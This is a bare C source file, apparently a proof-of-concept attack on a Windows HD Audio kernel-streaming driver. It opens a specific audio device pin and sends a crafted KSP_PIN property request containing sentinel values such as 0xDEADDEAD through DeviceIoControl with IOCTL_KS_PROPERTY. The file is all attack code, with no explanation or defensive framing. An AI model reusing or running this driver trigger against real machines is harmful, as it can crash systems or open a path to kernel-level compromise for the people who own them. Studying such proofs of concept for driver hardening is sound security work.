#include<mmdeviceapi.h>
#include<stdio.h>
#include<Functiondiscoverykeys_devpkey.h>
#include <tchar.h>
#include <stdlib.h> 
#include<time.h> 
#include <ctype.h>
#define KSPROPERTY_TYPE_GET                 0x00000001//0
const char KSPIN_Topology[] = "\x60\x49\x13\x8c\xad\x51\xcf\x11\x87\x8a\x94\xf8\x01\xc1\x00\x00";
#define IOCTL_KS_PROPERTY              CTL_CODE(FILE_DEVICE_KS, 0x000, METHOD_NEITHER, FILE_ANY_ACCESS)
struct KSPROPERTY {
    GUID  Set;
    ULONG Id;
    ULONG Flags;
};
typedef struct {
    KSPROPERTY Property;
    ULONG      PinId;
    union {
        ULONG Reserved;
        ULONG Flags;
    };
    DWORD arg[0x10];

} KSP_PIN, * PKSP_PIN;
int main()
{
    HANDLE h = CreateFileW(L"\\\\?\\HDAUDIO#FUNC_01&VEN_15AD&DEV_1975&SUBSYS_15AD1975&REV_1001#5&217be3d6&0&0001#{65e8773d-8f56-11d0-a3b9-00a0c9223196}\\emicinwave",
            FILE_READ_ACCESS | FILE_WRITE_ACCESS,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);
  SIZE_T inputLength = 0x68;
	SIZE_T outputLength = 0x10e;
	char* inputBuffer = (char*)VirtualAlloc(NULL, inputLength, MEM_COMMIT, PAGE_READWRITE);
	printf("Address of input buffer :  0x%p GLE : 0x%x", inputBuffer, GetLastError());
	char* outputBuffer = (char*)VirtualAlloc(NULL, outputLength, MEM_COMMIT, PAGE_READWRITE);
	printf("Address of output buffer :  0x%p GLE : 0x%x", outputBuffer, GetLastError());
	
	KSP_PIN pin = { 0 };
	
	pin.Property.Flags = 0;
	
	pin.Property.Flags = KSPROPERTY_TYPE_GET ;
	pin.Property.Id = 4;

	pin.PinId = 1;
	int index;
	for (index = 0; index < 0x10; ++index)
	{
		pin.arg[index] = index;
	}
	pin.arg[1] = 0xDEADDEAD;
	pin.arg[2] = 0x11111111;
	pin.arg[3] = 6;
	memcpy(&pin.Property.Set, &KSPIN_Topology, 16);

	memcpy(inputBuffer, &pin, sizeof(KSP_PIN));
	DWORD retByte;
	OVERLAPPED overlap = { 0 };
	NTSTATUS status;

	status = DeviceIoControl(h, IOCTL_KS_PROPERTY, inputBuffer, inputLength, outputBuffer, outputLength, &retByte, &overlap);
	VirtualFree(outputBuffer, 0, MEM_RELEASE);
	CloseHandle(h);    

    

}